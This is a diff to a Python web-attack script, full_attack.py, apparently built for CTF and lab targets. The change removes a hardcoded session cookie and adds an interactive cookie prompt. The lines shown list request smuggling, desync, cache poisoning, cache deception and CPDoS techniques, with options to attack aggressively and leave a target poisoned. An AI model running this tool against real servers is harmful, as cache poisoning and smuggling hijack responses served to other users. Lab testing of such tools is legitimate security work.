@@ -39,9 +39,12 @@ Success model (generic, no per-challenge tuning needed):
 Authorized testing only (CTF / lab / your own systems).
 
 Examples:
-  python full_attack.py --host 192.168.1.77 --port 5002 \
-      --cookie "hacker_token=13-AABHjyXghT3KLRiNvETNkQ-13" \
+  python full_attack.py --host TARGET --port 5002 \
+      --cookie "session=<your-token-here>" \
       --target /login --source /join
+
+  # Omit --cookie and you'll be asked whether the target needs one, then prompted.
+  python full_attack.py --from-recon recon.json --aggressive
 
   python full_attack.py --host T --port 80 --target /login --tech smuggle,poison --aggressive
   python full_attack.py --host T --port 80 --target /login --keep    # leave it poisoned
@@ -55,7 +58,8 @@ import sys
 import time
 
 try:
-    from full_recon import Target, parse, split_responses, cache_bust, C, phase
+    from full_recon import (Target, parse, split_responses, cache_bust, C, phase,
+                            resolve_cookie)
 except ImportError:
     sys.exit("error: full_attack.py must sit next to full_recon.py (it reuses its "
              "socket/parse primitives).")
@@ -783,9 +787,11 @@ ALL_TECH = ["smuggle", "desync", "poison", "deception", "cpdos", "hmc", "chain"]
 
 
 # Fallback defaults used when neither the CLI nor a --from-recon file supplies a value.
+# No cookie is shipped: supply your own with --cookie, via the recon file, or answer
+# the interactive prompt. Never hardcode a real session token here.
 DEFAULTS = {
     "host": "192.168.1.77", "port": 5002,
-    "cookie": "hacker_token=13-AABHjyXghT3KLRiNvETNkQ-13",
+    "cookie": None,
     "target": "/login", "source": "/join", "drop_path": "/drop",
 }
 
@@ -807,7 +813,10 @@ def main():
     # user set them explicitly; precedence is: CLI > --from-recon file > DEFAULTS.
     ap.add_argument("--host")
     ap.add_argument("--port", type=int)
-    ap.add_argument("--cookie")
+    ap.add_argument("--cookie",
+                    help="Cookie header value (auth/session token). If omitted and "
+                         "not loaded from --from-recon, you'll be asked whether the "
+                         'target needs one. Use --cookie "" to force no cookie.')
     ap.add_argument("--target", help="endpoint to poison/attack")
     ap.add_argument("--source",
                     help="a different page whose body proves content substitution")
@@ -846,6 +855,8 @@ def main():
     host = pick("host", "host")
     port = pick("port", "port")
     cookie = pick("cookie", "cookie")
+    if cookie is None:                      # nothing on CLI or in the recon file
+        cookie = resolve_cookie(None)       # ask interactively (or "" if non-interactive)
     drop_path = args.drop_path if args.drop_path is not None else \
         recon.get("drop_path", DEFAULTS["drop_path"])
     target = pick("target", "target", from_best=True)
